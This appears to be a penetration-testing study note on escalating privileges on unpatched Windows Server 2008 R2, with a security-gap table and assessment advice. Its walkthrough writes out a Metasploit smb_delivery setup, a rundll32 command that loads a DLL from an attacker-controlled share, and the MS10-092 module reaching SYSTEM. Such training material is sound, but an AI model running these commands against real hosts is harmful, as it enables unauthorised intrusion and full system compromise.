# Windows Server 2008 — Legacy OS PrivEsc

## Server 2008 vs. Modern Windows Server — Security Feature Gaps

| Feature | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
|---|---|---|---|---|
| Windows Defender ATP | ✗ | ✗ | ✗ | ✓ |
| Just Enough Administration | Partial | Partial | ✓ | ✓ |
| Credential Guard | ✗ | ✗ | ✓ | ✓ |
| Remote Credential Guard | ✗ | ✗ | ✓ | ✓ |
| Device Guard (code integrity) | ✗ | ✗ | ✓ | ✓ |
| AppLocker | Partial | ✓ | ✓ | ✓ |
| Windows Defender | Partial | Partial | ✓ | ✓ |
| Control Flow Guard | ✗ | ✗ | ✓ | ✓ |

**EOL date:** January 14, 2020. Commonly found internally at hospitals, universities, local government, and large enterprises.

---

## Assessment Notes for Legacy Systems
- Understand the **business reason** why the system can't be upgraded before recommending decommission.
- Medical settings may run costly MRI/vendor software tied to Server 2003/2008 — simple "upgrade" recommendations are insufficient.
- Always check: is the host fragile/mission-critical? An exploit could cause outages.
- Recommend **network segmentation** as a compensating control when retirement/upgrade isn't immediately viable.
- Regulatory environments (HIPAA, government funding) may be forced to act on legacy findings due to audit implications.

---

## Exploitation Walkthrough — Server 2008 R2

### Step 1 — Check patch level
```cmd
wmic qfe
```
Cross-reference the most recent KB against known CVEs — a single missing hotfix from 2011 on a Server 2008 host indicates years of missed patches.

### Step 2 — Run Sherlock for missing patch analysis
[Sherlock](https://github.com/rasta-mouse/Sherlock) compares the system against known local privesc vulnerabilities:
```powershell
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```

**Notable findings from example output:**
- **MS10-092** — Task Scheduler .XML privesc → `Appears Vulnerable`
- **MS15-051** — ClientCopyImage Win32k → `Appears Vulnerable`
- **MS16-032** — Secondary Logon Handle → `Appears Vulnerable`

Alternative tool: **[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)** — takes `systeminfo` output and cross-references against Microsoft's vulnerability database, suggesting Metasploit modules where available.

### Step 3 — Get a Meterpreter shell (smb_delivery)
```
use exploit/windows/smb/smb_delivery
set target 0   # DLL
set SRVHOST <attacker_ip>
set LHOST <attacker_ip>
exploit
```
Copy the generated `rundll32.exe` command and run it on the target:
```cmd
rundll32.exe \\<attacker_ip>\<share>\test.dll,0
```
→ Meterpreter session opens.

### Step 4 — Migrate to a 64-bit process (required for MS10-092)
```
sessions -i 1
getpid
ps
migrate <x64_pid>    # e.g. conhost.exe, taskhost.exe, explorer.exe
background
```

### Step 5 — Run the Task Scheduler privesc (MS10-092)
```
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <attacker_ip>
set LPORT 4443
exploit
```
→ New Meterpreter session opens as `NT AUTHORITY\SYSTEM`.

```
getuid
# Server username: NT AUTHORITY\SYSTEM
```

---

## Key Takeaway
Legacy Server 2008 systems are often trivially exploitable due to years of missing patches and absent modern security controls. The typical chain is:

1. `wmic qfe` → confirm sparse patching
2. Sherlock or Windows-Exploit-Suggester → identify applicable exploits
3. Deliver initial Meterpreter session (smb_delivery or other)
4. Migrate to x64 process if needed
5. Apply local privesc exploit (MS10-092, MS16-032, MS15-051, etc.)

Challenge yourself to find **multiple** escalation paths — Server 2008 hosts typically have several.